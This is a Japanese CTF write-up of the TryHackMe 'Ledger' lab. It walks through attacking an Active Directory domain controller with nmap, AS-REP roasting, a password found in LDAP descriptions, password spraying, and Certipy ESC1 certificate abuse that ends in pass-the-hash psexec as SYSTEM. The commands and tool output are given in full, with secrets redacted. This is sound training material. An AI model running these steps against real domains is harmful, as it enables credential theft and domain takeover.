# Ledger CTF

https://tryhackme.com/room/ledger

## Enumeration

```shell
TARGET=10.48.134.69
sudo bash -c "echo $TARGET   ledger.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
443/tcp   open  https            syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
7680/tcp  open  pando-pub        syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49675/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49677/tcp open  unknown          syn-ack ttl 128
49680/tcp open  unknown          syn-ack ttl 128
49683/tcp open  unknown          syn-ack ttl 128
49714/tcp open  unknown          syn-ack ttl 128
49715/tcp open  unknown          syn-ack ttl 128
49722/tcp open  unknown          syn-ack ttl 128
49814/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,7680,9389,47001,49664,49665,49666,49668,49671,49675,49676,49677,49680,49683,49714,49715,49722,49814 $TARGET

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain?
80/tcp    open   http          Microsoft IIS httpd 10.0
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 01:17:11Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
443/tcp   open   ssl/http      Microsoft IIS httpd 10.0
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
7680/tcp  closed pando-pub
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49675/tcp open   msrpc         Microsoft Windows RPC
49676/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc         Microsoft Windows RPC
49680/tcp open   msrpc         Microsoft Windows RPC
49683/tcp open   msrpc         Microsoft Windows RPC
49714/tcp open   msrpc         Microsoft Windows RPC
49715/tcp open   msrpc         Microsoft Windows RPC
49722/tcp open   msrpc         Microsoft Windows RPC
49814/tcp open   msrpc         Microsoft Windows RPC
```

### SMB, NFS, LDAP

```sh
enum4linux-ng -A $TARGET -oA results.txt

 ====================================================
|    Domain Information via LDAP for 10.48.134.69    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: thm.local

 ===========================================================
|    Domain Information via SMB session for 10.48.134.69    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: LABYRINTH                                                                                   
NetBIOS domain name: THM                                                                                           
DNS domain: thm.local                                                                                              
FQDN: labyrinth.thm.local                                                                                          
Derived membership: domain member                                                                                  
Derived domain: THM
```

```sh
$ smbclient -L //$TARGET -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.134.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ユーザー一覧を取得。User.txtを作成。

```sh
$ nxc smb $TARGET -u '' -p '' --rid-brute
SMB         10.48.134.69    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.48.134.69    445    LABYRINTH        [+] thm.local\: 
SMB         10.48.134.69    445    LABYRINTH        498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.48.134.69    445    LABYRINTH        500: THM\Administrator (SidTypeUser)
SMB         10.48.134.69    445    LABYRINTH        501: THM\Guest (SidTypeUser)
SMB         10.48.134.69    445    LABYRINTH        502: THM\krbtgt (SidTypeUser)
SMB         10.48.134.69    445    LABYRINTH        512: THM\Domain Admins (SidTypeGroup)
...
```

## kerberos

### AS-REP Roasting

5ユーザーのハッシュが出たが、rockyou + best64 でクラック不可。

```sh
GetNPUsers.py -dc-ip $TARGET thm.local/ -usersfile User.txt

$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:9fae7c167965f0[REDACRED]
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:454d8397f1864ac[REDACRED]
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:0fc2b2336bdaecf[REDACRED]
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:1ea287d0abddd1[REDACRED]
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:9eebd63186a2d[REDACRED]
```

### パスワード推測

- ユーザー名＝パスワードのパターンは全滅

LDAP で、descriptionをみると、パスワードを変えろというメッセージがあった。

```sh
ldapsearch -x -H ldap://$TARGET -b "dc=thm,dc=local" > ldapsearch.txt
cat ./ldapsearch.txt | grep descri | sort | uniq

...
description: Please change it: [REDACTED]
...
```

パスワードスプレーを実行し、2ユーザーで認証成功。

```sh
nxc smb $TARGET -u User.txt -p '[REDACTED]' --continue-on-success
```

ケルベロースティングでは何も出なかった。

Bloodhoundで、SUSANNA_MCKNIGHT が RDPグループに属していることを確認。RDPで接続できた。  
ユーザーフラグを入手。

## 権限昇格

Usersフォルダで、BRADLEY_ORTIZ フォルダを発見。Bloodhoundでドメイン管理者であることが分かる。

### privsec

平文パスワードを発見。パスワードスプレーを実行したところ greg ユーザーのパスワードだった。

```ps
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ Credentials - WinLogon                            ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'WinLogon' registry key contains           ┃
┃ clear-text credentials. Note that entries with an empty      ┃
┃ password field are filtered out.                             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Domain   : THM
Username : andrea
Password : [REDACTED]
```

## greg

Bloodhound で、次のパスがつながっているように見える。

greg -> JOSEF_MONROE -> TAMRA_BULLOCK -> LABYRINTH.THM.LOCAL

が、ACLを見る限り JOSEF_MONROE に対して権限があるようには見えなかった。

## certipy

証明書関連の脆弱性を列挙するツール。

```sh
$ certipy-ad find -u SUSANNA_MCKNIGHT@local.thm -p '[REDACTED]' -dc-ip $TARGET -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA
[!] Got error while trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'thm-LABYRINTH-CA'
[*] Saved BloodHound data to '20260309152700_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20260309152700_Certipy.txt'
[*] Saved JSON output to '20260309152700_Certipy.json'
```

出力

```
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
  1
    Template Name                       : Computer2
    Display Name                        : Computer2
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

これを見ると、証明書テンプレート悪用の3条件を満たしていることが分かる。

1. テンプレートの権限
2. クライアント証明 EKU
3. サブジェクト別名（SAN）を指定可能

### [ESC1 エクスプロイト](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)

証明書を要求

```sh
$ certipy req \
    -u 'SUSANNA_MCKNIGHT@corp.local' -p '[REDACTED]' \
    -dc-ip $TARGET -target 'labyrinth.thm.local' \
    -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
    -upn 'administrator@thm.local' -sid 'S-1-5-21-1966530601-3185510712-10604624-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@thm.local'
[*] Certificate object SID is 'S-1-5-21-1966530601-3185510712-10604624-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

取得した証明書を使用して認証

```sh
$ certipy auth -pfx 'administrator.pfx' -dc-ip $TARGET
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@thm.local'
[*]     SAN URL SID: 'S-1-5-21-1966530601-3185510712-10604624-500'
[*]     Security Extension SID: 'S-1-5-21-1966530601-3185510712-10604624-500'
[*] Using principal: 'administrator@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a[REDACTED]
```

administrator のハッシュは取れたが、シェルは起動できなかった。

```sh
$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d677a[REDACTED] administrator@$TARGET
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006e - STATUS_ACCOUNT_RESTRICTION - Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).
```

代わりに、ドメイン管理者である SUSANNA_MCKNIGHT を狙う。

```sh
certipy req \
    -u 'SUSANNA_MCKNIGHT@corp.local' -p '[REDACTED]' \
    -dc-ip $TARGET -target 'labyrinth.thm.local' \
    -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
    -upn 'BRADLEY_ORTIZ@thm.local' -sid 'S-1-5-21-1966530601-3185510712-10604624-1358'

$ certipy auth -pfx 'bradley_ortiz.pfx' -dc-ip $TARGET
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'BRADLEY_ORTIZ@thm.local'
[*]     SAN URL SID: 'S-1-5-21-1966530601-3185510712-10604624-1358'
[*]     Security Extension SID: 'S-1-5-21-1966530601-3185510712-10604624-1358'
[*] Using principal: 'bradley_ortiz@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bradley_ortiz.ccache'
[*] Wrote credential cache to 'bradley_ortiz.ccache'
[*] Trying to retrieve NT hash for 'bradley_ortiz'
[*] Got hash for 'bradley_ortiz@thm.local': aad3b435b51404eeaad3b435b51404ee:16ec319[REDACTED]
```

昇格成功。

```sh
$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:16ec319[REDACTED] bradley_ortiz@$TARGET
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.48.145.83.....
[*] Found writable share ADMIN$
[*] Uploading file PyNPAqyn.exe
[*] Opening SVCManager on 10.48.145.83.....
[*] Creating service KHIi on 10.48.145.83.....
[*] Starting service KHIi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```sh
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/31/2023  08:18 AM    <DIR>          .
05/31/2023  08:18 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/31/2023  07:33 AM                29 root.txt
               3 File(s)          1,110 bytes
               2 Dir(s)  12,496,277,504 bytes free
```

## 振り返り

- ldap の description からパスワードを取るパターンは初めて見た。
- 証明書テンプレート悪用の昇格はウォークスルーで学んだことがあるがCTFで見たのは初めてで非常に勉強になった。

## Tags

#tags:Kerberos #tags:証明書テンプレート #tags:Certipy
